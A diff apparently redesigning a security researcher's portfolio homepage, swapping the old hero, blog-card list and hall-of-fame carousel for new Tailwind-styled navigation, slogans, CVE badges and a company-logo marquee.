+                <button id="menu-toggle" class="lg:hidden min-h-[44px] min-w-[44px] p-2 text-primary hover:bg-white/5 rounded-lg transition-colors active:scale-95 flex items-center justify-center relative z-[110]" aria-label="Toggle menu">
+                    <i data-lucide="menu" class="w-6 h-6 menu-icon"></i>
+                    <i data-lucide="x" class="w-6 h-6 close-icon hidden"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile Nav Dropdown -->
+        <div id="mobile-menu" class="lg:hidden fixed inset-0 bg-background-dark/98 backdrop-blur-2xl z-[105] hidden flex flex-col items-center justify-center p-8">
+            <div class="flex flex-col gap-6 w-full max-w-xs">
+                <a href="index.html#blog" class="mobile-nav-link group relative flex items-center gap-4 px-6 py-5 overflow-hidden transition-all duration-300" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/5 bg-white/[0.02]"></div>
+                    <div class="absolute top-0 left-0 w-1.5 h-full bg-primary opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                    <i data-lucide="rss" class="w-6 h-6 text-primary"></i>
+                    <span class="text-sm font-mono font-bold tracking-widest text-white uppercase">BLOG</span>
+                </a>
+                <a href="index.html#blog" class="mobile-nav-link group relative flex items-center gap-4 px-6 py-5 overflow-hidden transition-all duration-300" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/5 bg-white/[0.02]"></div>
+                    <div class="absolute top-0 left-0 w-1.5 h-full bg-primary opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                    <i data-lucide="bug" class="w-6 h-6 text-primary"></i>
+                    <span class="text-sm font-mono font-bold tracking-widest text-white uppercase">CVES</span>
+                </a>
+                <a href="books.html" class="mobile-nav-link group relative flex items-center gap-4 px-6 py-5 overflow-hidden transition-all duration-300">
+                    <div class="absolute inset-0 border border-white/5 bg-white/[0.02]"></div>
+                    <div class="absolute top-0 left-0 w-1.5 h-full bg-primary opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                    <i data-lucide="book-open" class="w-6 h-6 text-primary"></i>
+                    <span class="text-sm font-mono font-bold tracking-widest text-white uppercase">BOOKS</span>
+                </a>
+                <a href="index.html#hall-of-fame" class="mobile-nav-link group relative flex items-center gap-4 px-6 py-5 overflow-hidden transition-all duration-300" onclick="var m=document.getElementById('blog-modal');if(m&&!m.classList.contains('hidden')){m.classList.add('hidden');document.body.style.overflow='';}">
+                    <div class="absolute inset-0 border border-white/5 bg-white/[0.02]"></div>
+                    <div class="absolute top-0 left-0 w-1.5 h-full bg-primary opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                    <i data-lucide="trophy" class="w-6 h-6 text-primary"></i>
+                    <span class="text-sm font-mono font-bold tracking-widest text-white uppercase">HALL_OF_FAME</span>
+                </a>
+                <a href="contact.html" class="mobile-nav-link group relative flex items-center gap-4 px-6 py-5 overflow-hidden transition-all duration-300 bg-primary/10 border border-primary/30">
+                    <div class="absolute top-0 left-0 w-2 h-2 bg-primary"></div>
+                    <i data-lucide="send" class="w-6 h-6 text-primary"></i>
+                    <span class="text-sm font-mono font-bold tracking-widest text-primary uppercase">CONTACT_ME</span>
+                </a>
+            </div>
         </div>
     </header>
-    
-    <!-- Hero Section -->
-    <section id="hero" class="hero-section">
-        <div class="hero-backdrop"></div>
-        <div class="animated-gradient"></div>
-        
-        <div class="hero-content">
-            <div class="hero-panel">
-                <div class="hero-left">
-                <div class="badge-container">
-                    <span class="elite-badge"><i class="fas fa-user-secret"></i> Security Researcher · Ethical Hacker</span>
-                </div>
-                <h1 class="hero-title">Break It. <span class="accent">Secure It.</span></h1>
-                <p class="hero-subtitle">Turning real‑world bugs into resilient systems across <span class="typing-text"></span></p>
-                <div class="hero-keywords">
-                    <span class="keyword-tag">Android & iOS Security</span>
-                    <span class="keyword-tag">Web3 Security</span>
-                    <span class="keyword-tag">CVE Research</span>
-                    <span class="keyword-tag">Bug Bounty</span>
-                </div>
-                <div class="tech-tags">
-                    <div class="tech-tag">
-                        <i class="fab fa-ethereum"></i>
-                        <span>Web3</span>
-                    </div>
-                    <div class="tech-tag">
-                        <i class="fab fa-android"></i>
-                        <span>Android</span>
-                    </div>
-                    <div class="tech-tag">
-                        <i class="fas fa-globe"></i>
-                        <span>Web2</span>
-                    </div>
-                    <div class="tech-tag">
-                        <i class="fab fa-apple"></i>
-                        <span>iOS</span>
-                    </div>
-                    <div class="tech-tag">
-                        <i class="fas fa-cloud"></i>
-                        <span>Cloud</span>
-                    </div>
-                </div>
-                
-                    <div class="hero-buttons">
-                        <a href="#blog" class="btn primary-btn"><i class="fas fa-book-open"></i> Writeups</a>
-                        <a href="#hall-of-fame" class="btn secondary-btn"><i class="fas fa-trophy"></i> Achievements</a>
-                        <a href="contact.html" class="btn outline-btn"><i class="fas fa-paper-plane"></i> Contact</a>
+
+    <main class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-24 sm:pt-32 md:pt-36 pb-12 sm:pb-20">
+        <div class="glass-panel border-white/10 rounded-2xl sm:rounded-[40px] p-6 sm:p-8 md:p-16 overflow-hidden relative fade-in">
+            <!-- Ambient Glows -->
+            <div class="absolute -top-48 -left-48 w-[600px] h-[600px] bg-primary/5 blur-[120px] rounded-full"></div>
+            <div className="absolute -bottom-48 -right-48 w-[600px] h-[600px] bg-accent/5 blur-[120px] rounded-full"></div>
+
+            <div class="grid lg:grid-cols-2 gap-16 items-center">
+                <!-- Left Content -->
+                <div class="space-y-12 relative z-20">
+                    <div class="inline-flex items-center gap-3 px-6 py-2.5 rounded-full bg-gradient-to-r from-primary/10 via-accent/10 to-primary/10 border border-white/10 backdrop-blur-xl relative overflow-hidden group cursor-default">
+                        <div class="absolute inset-0 bg-gradient-to-r from-primary/20 via-accent/20 to-primary/20 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                        <i data-lucide="shield-check" class="w-4 h-4 text-primary relative z-10 animate-pulse"></i>
+                        <span class="text-[10px] md:text-xs font-display tracking-[0.3em] uppercase text-white relative z-10 font-bold">
+                            Senior Security Researcher <span class="mx-2 text-accent">/</span> Exploit Dev
+                        </span>
                     </div>
 
-                <div id="cves" class="hero-cves">
-                    <article class="cve-card cve-green">
-                        <div class="cve-icon-wrap">
-                            <i class="fas fa-trophy cve-icon" aria-hidden="true"></i>
-                        </div>
-                        <div class="cve-text">
-                            <div class="cve-code">CVE-2025-66513</div>
-                            <div class="cve-status">CVE Assigned</div>
-                        </div>
-                    </article>
+                    <h1 class="text-4xl sm:text-5xl md:text-6xl lg:text-7xl xl:text-8xl font-display font-extrabold leading-[0.9] sm:leading-[0.85] tracking-tight text-white">
+                        ASSUME NOTHING.<br/>
+                        <span class="text-primary text-glow-cyan italic">TRUST NO INPUT.</span><br/>
+                        LOG EVERYTHING.
+                    </h1>
 
-                    <article class="cve-card cve-blue">
-                        <div class="cve-icon-wrap">
-                            <i class="fas fa-trophy cve-icon" aria-hidden="true"></i>
-                        </div>
-                        <div class="cve-text">
-                            <div class="cve-code">CVE-2025-66515</div>
-                            <div class="cve-status">CVE Assigned</div>
-                        </div>
-                    </article>
-                </div>
-                </div>
+                    <p class="text-lg md:text-xl text-slate-400 font-display leading-relaxed max-w-lg">
+                        I make <span class="text-primary typewriter-cursor ml-2">bugs regret existing.</span>
+                    </p>
 
-                <div class="hero-right">
-                <!-- Enhanced animated vector avatar -->
-                <div class="avatar-container">
-                    <div class="avatar-wrapper">
-                        <div class="hacker-avatar">
-                            <div class="avatar-head">
-                                <div class="avatar-face"></div>
-                                <div class="avatar-mask"></div>
-                                <div class="avatar-glasses"></div>
+                    <!-- Skill Constellation -->
+                    <div class="relative min-h-[200px] sm:min-h-[300px] max-w-xl">
+                        <div class="constellation-link w-32 rotate-[15deg] top-10 left-10"></div>
+                        <div class="constellation-link w-24 rotate-[110deg] top-20 left-48 opacity-40"></div>
+                        <div class="constellation-link w-40 rotate-[-25deg] top-36 left-4 opacity-30"></div>
+                        <div class="constellation-link w-20 rotate-[45deg] top-48 left-64"></div>
+
+                        <div class="relative flex flex-wrap items-start content-start gap-x-4 sm:gap-x-8 gap-y-4 sm:gap-y-6">
+                            <div class="relative cursor-default text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-extrabold tracking-tighter text-white">
+                                <span class="font-display block">ANDROID & IOS SECURITY</span>
                             </div>
-                            <div class="avatar-body"></div>
-                            <div class="glow-circle"></div>
-                        </div>
-                        <div class="code-bits">
-                            <div class="code-bit b1">01</div>
-                            <div class="code-bit b2">10</div>
-                            <div class="code-bit b3">00</div>
-                            <div class="code-bit b4">11</div>
-                            <div class="code-bit b5">01</div>
-                            <div class="code-bit b6">10</div>
-                        </div>
-                        <div class="security-circles">
-                            <div class="circle c1"></div>
-                            <div class="circle c2"></div>
-                            <div class="circle c3"></div>
-                        </div>
-                        <!-- Added shield animation elements -->
-                        <div class="shield-container">
-                            <div class="shield-outline"></div>
-                            <div class="shield-inner"></div>
-                            <div class="shield-icon"><i class="fas fa-lock"></i></div>
-                            <div class="shield-particles">
-                                <div class="shield-particle p1"></div>
-                                <div class="shield-particle p2"></div>
-                                <div class="shield-particle p3"></div>
-                                <div class="shield-particle p4"></div>
-                                <div class="shield-particle p5"></div>
+                            <div class="relative mt-4">
+                                <span class="font-display text-xl font-bold text-accent text-glow-magenta tracking-widest px-4 py-1 border-l-2 border-accent/50 bg-accent/5 backdrop-blur-sm">
+                                    WEB3 SECURITY
+                                </span>
+                            </div>
+                            <div class="mt-2">
+                                <span class="font-display text-lg font-bold text-primary tracking-tight border-b border-primary/30 pb-1">
+                                    CVE RESEARCH
+                                </span>
+                            </div>
+                            <div class="mt-6">
+                                <span class="font-display text-xs text-primary text-glow-cyan uppercase tracking-[0.4em] opacity-80">
+                                    WEB3
+                                </span>
+                            </div>
+                            <div class="mt-1">
+                                <span class="font-display text-2xl font-black text-white px-6 py-2 bg-white/5 border border-white/10 rounded-sm backdrop-blur-md shadow-2xl hover:bg-white/10 transition-colors">
+                                    BUG BOUNTY
+                                </span>
+                            </div>
+                            <div class="mt-4">
+                                <span class="font-display text-sm font-medium text-slate-400 tracking-widest border-b border-white/20 hover:text-white transition-colors cursor-default">
+                                    ANDROID
+                                </span>
+                            </div>
+                             <div class="mt-2 relative">
+                                <span class="font-display text-xs text-accent/80 tracking-widest px-3 py-1.5 border-t border-r border-accent/20">
+                                    IOS
+                                </span>
+                            </div>
+                            <div class="mt-8">
+                                <span class="font-display text-[10px] text-slate-500 tracking-[0.5em] hover:text-primary transition-colors cursor-default">
+                                    WEB2
+                                </span>
+                            </div>
+                            <div class="mt-0">
+                                <span class="font-display text-xl font-bold text-white/90 italic tracking-tight border-b-4 border-primary/20">
+                                    CLOUD
+                                </span>
                             </div>
                         </div>
                     </div>
                 </div>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Blog Section -->
-    <section id="blog" class="blog-section">
-        <div class="container">
-            <h2>Blog & Insights</h2>
-            
-            <div class="blog-filters">
-                <button class="filter-btn active" data-filter="all">All</button>
-                <button class="filter-btn" data-filter="android">Android Security</button>
-                <button class="filter-btn" data-filter="ios">iOS Security</button>
-                <button class="filter-btn" data-filter="web">Web Security</button>
-                <button class="filter-btn" data-filter="web3">Web3 Security</button>
-                <!-- <button class="filter-btn" data-filter="blockchain">Blockchain</button> -->
-                <button class="filter-btn" data-filter="philosophy">Philosophy</button>
-            </div>
-            
-            <div class="blog-grid">
-                <article class="blog-card" data-category="android mobile" data-image="images/a2.jpeg">
-                    <div class="blog-image" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Android Security</span>
-                        <h3>When WebView Bites Back: The Bug That Let JavaScript Run Wild</h3>
-                        <p>Discovering how improper WebView implementations in Android applications can lead to arbitrary JavaScript execution and potential security risks.</p>
-                        <a href="blog/android-webview-vulnerability.html" class="read-more">Read More</a>
+                <!-- Right Content - 3D Octahedron -->
+                <div class="flex justify-center items-center relative py-16 lg:py-32">
+                    <div class="absolute w-[400px] h-[400px] core-light rounded-full opacity-20 blur-[100px] animate-pulse-glow"></div>
+                    <div class="relative animate-float">
+                        <div class="core-container">
+                            <div class="octahedron animate-rotate-3d">
+                                <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-24 h-24 core-light rounded-full blur-[30px] opacity-60"></div>
+                                <div class="face face-top f1"></div>
+                                <div class="face face-top f2"></div>
+                                <div class="face face-top f3"></div>
+                                <div class="face face-top f4"></div>
+                                <div class="face face-bottom f5"></div>
+                                <div class="face face-bottom f6"></div>
+                                <div class="face face-bottom f7"></div>
+                                <div class="face face-bottom f8"></div>
+                            </div>
+                        </div>
                     </div>
-                </article>
-                
-                <article class="blog-card" data-category="android mobile" data-image="images/android-auth.jpeg">
-                    <div class="blog-image" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Android Security</span>
-                        <h3>How a News App Leaked OAuth Codes: A Real-World Interception Story</h3>
-                        <p>Discovering a critical vulnerability in an Android news application that allowed malicious apps to intercept OAuth authorization codes.</p>
-                        <a href="blog/android-news-app-vulnerability.html" class="read-more">Read More</a>
-                    </div>
-                </article>
-                
-                <article class="blog-card" data-category="web web-security">
-                    <div class="blog-image" style="--card-image: url('images/1.jpeg');" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Web Security</span>
-                        <h3>SQLi Finding and Exploitation</h3>
-                        <p>A detailed walkthrough of discovering and exploiting a SQL injection vulnerability that led to a significant bug bounty reward.</p>
-                        <a href="blog/sql-injection-writeup.html" class="read-more">Read More</a>
-                    </div>
-                </article>
-                
-                <article class="blog-card" data-category="web3 blockchain">
-                    <div class="blog-image" style="background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('images/a-cinematic-shot-of-an-ancient-roman-sol_t3A0SO6aReCvbe86gvJsbQ_v7YBD9yISKaYmsfNGwsoOw.jpeg');" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Web3 Security</span>
-                        <h3>Unlimited Mint: The Chair Function That Could Break a Stablecoin</h3>
-                        <p>Analysis of a critical vulnerability that allowed unlimited token minting in a DeFi protocol, potentially leading to protocol insolvency.</p>
-                        <a href="blog/unrestricted-minting-exploit.html" class="read-more">Read More</a>
-                    </div>
-                </article>
-                
-                <article class="blog-card" data-category="philosophy">
-                    <div class="blog-image" style="background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('images/a-photo-of-an-ancient-philosopher-sittin_KSoCpSEuThSZp1cxTDGZig_QrGpSDY0RFeH_8blpf_vBw.jpeg');" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Philosophy</span>
-                        <h3>Good vs. Bad: Are We Seeing Truth or Just Our Own Biases?</h3>
-                        <p>Exploring the timeless philosophical debate on whether morality is objective, subjective, or something in between.</p>
-                        <a href="blog/philosophy-good-bad-bias.html" class="read-more">Read More</a>
-                    </div>
-                </article>
-                
-                <!-- Smart Contract Vulnerabilities blog post - commented out
-                <article class="blog-card" data-category="web3 blockchain">
-                    <div class="blog-image" style="--card-image: url('images/smart-contract.jpg');" loading="lazy"></div>
-                    <div class="blog-content">
-                        <span class="blog-category">Web3 Security</span>
-                        <h3>Common Vulnerabilities in Smart Contracts</h3>
-                        <p>Exploring the most critical security vulnerabilities in smart contracts and how to protect against them.</p>
-                        <a href="blog/smart-contract-vulnerabilities.html" class="read-more">Read More</a>
-                    </div>
-                </article>
-                -->
-            </div>
-        </div>
-    </section>
-
-    <!-- Expertise Section -->
-    <!-- 
-    <section id="expertise" class="expertise">
-        <div class="container">
-            <h2>Areas of Expertise</h2>
-            <div class="expertise-grid">
-                <div class="expertise-card">
-                    <i class="fab fa-android"></i>
-                    <h3>Android Security</h3>
-                    <p>Mobile application pentesting, vulnerability assessment, and secure development practices.</p>
-                </div>
-                <div class="expertise-card">
-                    <i class="fab fa-apple"></i>
-                    <h3>iOS Security</h3>
-                    <p>iOS application security, threat modeling, and security architecture reviews.</p>
-                </div>
-                <div class="expertise-card">
-                    <i class="fas fa-globe"></i>
-                    <h3>Web Security</h3>
-                    <p>Web application security, OWASP Top 10 vulnerabilities, and secure coding practices.</p>
-                </div>
-                <div class="expertise-card">
-                    <i class="fas fa-cubes"></i>
-                    <h3>Web3 Security</h3>
-                    <p>Smart contract auditing, DApp security, and decentralized protocol analysis.</p>
-                </div>
-                <div class="expertise-card">
-                    <i class="fas fa-link"></i>
-                    <h3>Blockchain</h3>
-                    <p>Blockchain architecture, consensus mechanisms, and distributed systems security.</p>
-                </div>
-                <div class="expertise-card">
-                    <i class="fas fa-brain"></i>
-                    <h3>Philosophy</h3>
-                    <p>Ethics in security research, digital privacy philosophy, and technological determinism.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-    -->
-
-    <!-- Hall of Fame Section (Replacing Contact Section) -->
-    <section id="hall-of-fame" class="hall-of-fame">
-        <div class="container">
-            <h2>Hall of Fame & Thanks Received</h2>
-            
-            <div class="hof-controls">
-                <button class="hof-nav-btn prev-btn" aria-label="Previous"><i class="fas fa-chevron-left"></i></button>
-                <button class="hof-nav-btn next-btn" aria-label="Next"><i class="fas fa-chevron-right"></i></button>
-            </div>
-
-            <div class="hof-carousel-container">
-                <div class="hof-carousel">
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-google"></i></div>
-                        <h3>Google</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-microsoft"></i></div>
-                        <h3>Microsoft</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-apple"></i></div>
-                        <h3>Apple</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-facebook"></i></div>
-                        <h3>Meta</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-amazon"></i></div>
-                        <h3>Amazon</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo hof-logo-text">intel</div>
-                        <h3>Intel</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-glasses"></i></div>
-                        <h3>Lenskart</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-lightbulb"></i></div>
-                        <h3>Philips</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-building"></i></div>
-                        <h3>Visma</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-car-side"></i></div>
-                        <h3>Mercedes Benz</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-tshirt"></i></div>
-                        <h3>H&M</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-landmark"></i></div>
-                        <h3>Dutch Gov</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-balance-scale"></i></div>
-                        <h3>Dutch Judiciary</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-heartbeat"></i></div>
-                        <h3>Dutch Healthcare</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-shield-alt"></i></div>
-                        <h3>NCIIPC</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-chart-line"></i></div>
-                        <h3>Robeco</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-university"></i></div>
-                        <h3>WUR</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-shield-alt"></i></div>
-                        <h3>Zion</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-pump-medical"></i></div>
-                        <h3>Reckitt</h3>
-                        <div class="hof-year">2023</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-cloud"></i></div>
-                        <h3>Nextcloud</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo hof-logo-text">adobe</div>
-                        <h3>Adobe</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-bitcoin"></i></div>
-                        <h3>Coinbase</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fas fa-fire"></i></div>
-                        <h3>Fireblocks</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-github"></i></div>
-                        <h3>GitHub</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-paypal"></i></div>
-                        <h3>PayPal</h3>
-                        <div class="hof-year">2024</div>
-                    </div>
-                    <div class="hof-card">
-                        <div class="hof-logo"><i class="fab fa-ubuntu"></i></div>
-                        <h3>Canonical</h3>
-                        <div class="hof-year">2024</div>
+                    <div class="absolute bottom-8 right-8 flex flex-col items-end gap-1 opacity-40">
+                        <span class="text-[8px] font-display text-primary tracking-[0.5em] uppercase">Core_Refraction_Index: 1.52</span>
+                        <span class="text-[8px] font-display text-accent tracking-[0.5em] uppercase">System_State: Stable</span>
                     </div>
                 </div>
             </div>
         </div>
-    </section>
 
-
-    <!-- Footer -->
-    <footer>
-        <div class="footer-content">
-            <div class="footer-grid">
-                <div class="footer-section">
-                    <h3>0xBalvant</h3>
-                    <p>Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security. CVE discoverer, bug bounty hunter, and security consultant building secure systems and sharing knowledge.</p>
-                    <div class="social-links">
-                        <a href="https://twitter.com/ba1van7" target="_blank" rel="noopener noreferrer" title="Twitter"><i class="fab fa-twitter"></i></a>
-                        <a href="https://linkedin.com/in/balvant-chavda" target="_blank" rel="noopener noreferrer" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
-                        <a href="https://balvant.in" target="_blank" rel="noopener noreferrer" title="Website"><i class="fas fa-globe"></i></a>
-                        <a href="mailto:contact@balvant.in" title="Email"><i class="fas fa-envelope"></i></a>
-                        <a href="https://discord.com/users/ba1van7" target="_blank" rel="noopener noreferrer" title="Discord"><i class="fab fa-discord"></i></a>
-                        <a href="https://app.ens.domains/name/balvant.eth" target="_blank" rel="noopener noreferrer" title="ENS"><i class="fab fa-ethereum"></i></a>
-                    </div>
-                </div>
-                <div class="footer-section">
-                    <h3>Quick Links</h3>
-                    <ul class="footer-links">
-                        <li><a href="#hero"><i class="fas fa-chevron-right"></i> Home</a></li>
-                        <li><a href="#blog"><i class="fas fa-chevron-right"></i> Blog</a></li>
-                        <li><a href="books.html"><i class="fas fa-chevron-right"></i> Books</a></li>
-                        <li><a href="#hall-of-fame"><i class="fas fa-chevron-right"></i> Hall of Fame</a></li>
-                        <li><a href="projects.html"><i class="fas fa-chevron-right"></i> Projects</a></li>
-                        <li><a href="contact.html"><i class="fas fa-chevron-right"></i> Contact</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Categories</h3>
-                    <ul class="footer-links">
-                        <li><a href="index.html#blog" class="filter-link" data-filter="android"><i class="fas fa-mobile-alt"></i> Android Security</a></li>
-                        <li><a href="index.html#blog" class="filter-link" data-filter="ios"><i class="fab fa-apple"></i> iOS Security</a></li>
-                        <li><a href="index.html#blog" class="filter-link" data-filter="web"><i class="fas fa-globe"></i> Web Security</a></li>
-                        <li><a href="index.html#blog" class="filter-link" data-filter="web3"><i class="fab fa-ethereum"></i> Web3 Security</a></li>
-                        <li><a href="index.html#blog" class="filter-link" data-filter="philosophy"><i class="fas fa-brain"></i> Philosophy</a></li>
-                    </ul>
-                </div>
+        <!-- Bottom CTA Buttons -->
+        <div class="mt-16 flex flex-col items-center w-full relative z-30 gap-8">
+            <div class="flex flex-col md:flex-row items-center gap-4">
+                <a class="nav-button group relative flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-primary rounded-sm transition-all shadow-[0_10px_30px_-10px_rgba(0,255,194,0.5)] active:scale-95" href="#blog">
+                    <i data-lucide="terminal" class="w-5 h-5 text-black font-bold shrink-0"></i>
+                    <span class="text-[10px] sm:text-[11px] font-display font-extrabold tracking-widest text-black uppercase">Security_Writeups</span>
+                </a>
+                <a class="nav-button group relative flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-accent rounded-sm transition-all shadow-[0_10px_30px_-10px_rgba(255,0,229,0.5)] active:scale-95" href="#hall-of-fame">
+                    <i data-lucide="award" class="w-5 h-5 text-white font-bold shrink-0"></i>
+                    <span class="text-[10px] sm:text-[11px] font-display font-extrabold tracking-widest text-white uppercase">Hall_of_Fame</span>
+                </a>
+                <a class="nav-button group relative flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-emerald rounded-sm transition-all shadow-[0_10px_30px_-10px_rgba(5,150,105,0.5)] active:scale-95" href="contact.html">
+                    <i data-lucide="radio" class="w-5 h-5 text-white font-bold shrink-0"></i>
+                    <span class="text-[10px] sm:text-[11px] font-display font-extrabold tracking-widest text-white uppercase">Direct_Contact</span>
+                </a>
             </div>
-            <div class="footer-bottom">
-                <p>&copy; 2025 Balvant Chavda. All rights reserved.</p>
+
+            <!-- CVE Assignments -->
+            <div class="flex flex-wrap justify-center gap-4">
+                <div class="relative group cursor-default">
+                    <div class="absolute -inset-0.5 bg-primary/20 blur opacity-0 group-hover:opacity-100 transition duration-500"></div>
+                    <span class="relative font-display text-xs font-black text-primary tracking-[0.2em] px-6 py-2 border border-primary/30 bg-primary/5 backdrop-blur-sm rounded-full flex items-center gap-2">
+                        <span class="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"></span>
+                        CVE-2025-66513 <span class="text-[8px] opacity-50">ASSIGNED</span>
+                    </span>
+                </div>
+                <div class="relative group cursor-default">
+                    <div class="absolute -inset-0.5 bg-accent/20 blur opacity-0 group-hover:opacity-100 transition duration-500"></div>
+                    <span class="relative font-display text-xs font-black text-accent tracking-[0.2em] px-6 py-2 border border-accent/30 bg-accent/5 backdrop-blur-sm rounded-full flex items-center gap-2">
+                        <span class="w-1.5 h-1.5 rounded-full bg-accent animate-pulse"></span>
+                        CVE-2025-66515 <span class="text-[8px] opacity-50">ASSIGNED</span>
+                    </span>
+                </div>
             </div>
         </div>
-    </footer>
-    
-    <!-- Scroll to Top Button -->
-    <button class="scroll-top" id="scrollTopBtn" aria-label="Scroll to top">
-        <i class="fas fa-chevron-up"></i>
-    </button>
 
-    <!-- JavaScript -->
-    <script src="js/main.js" defer></script>
-    <script src="js/scroll-effects.js" defer></script>
-    
-    <!-- Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=GG-3GS6VRP5FF"></script>
+        <!-- Hall of Fame Section -->
+        <div id="hall-of-fame" class="mt-20 sm:mt-32 relative z-20 overflow-hidden scroll-mt-24">
+            <div class="flex flex-col items-center mb-12">
+                <span class="text-primary font-display text-xs tracking-[0.4em] uppercase opacity-60 mb-2">Recognition_Archive</span>
+                <h2 class="font-display text-4xl md:text-5xl font-extrabold text-white tracking-tighter">
+                    HALL OF <span class="text-primary italic">FAME</span>
+                </h2>
+            </div>
+
+            <div class="relative flex border-y border-white/5 py-16 bg-black/20 backdrop-blur-sm group">
+                <!-- Fade Edges -->
+                <div class="absolute inset-y-0 left-0 w-32 bg-gradient-to-r from-background-dark to-transparent z-10"></div>
+                <div class="absolute inset-y-0 right-0 w-32 bg-gradient-to-l from-background-dark to-transparent z-10"></div>
+
+                <div class="flex animate-marquee whitespace-nowrap items-center">
+                    <!-- First Set -->
+                    <div class="flex items-center gap-16 px-8">
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/google/4285F4" class="hof-logo w-8 h-8 object-contain" alt="Google" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">GOOGLE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/microsoft/5E5E5E" class="hof-logo w-8 h-8 object-contain" alt="Microsoft" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">MICROSOFT</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/apple/FFFFFF" class="hof-logo w-8 h-8 object-contain" alt="Apple" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">APPLE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/meta/0668E1" class="hof-logo w-8 h-8 object-contain" alt="Meta" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">META</span>
+                        </div>
+                        <div class="flex items-center gap-4">
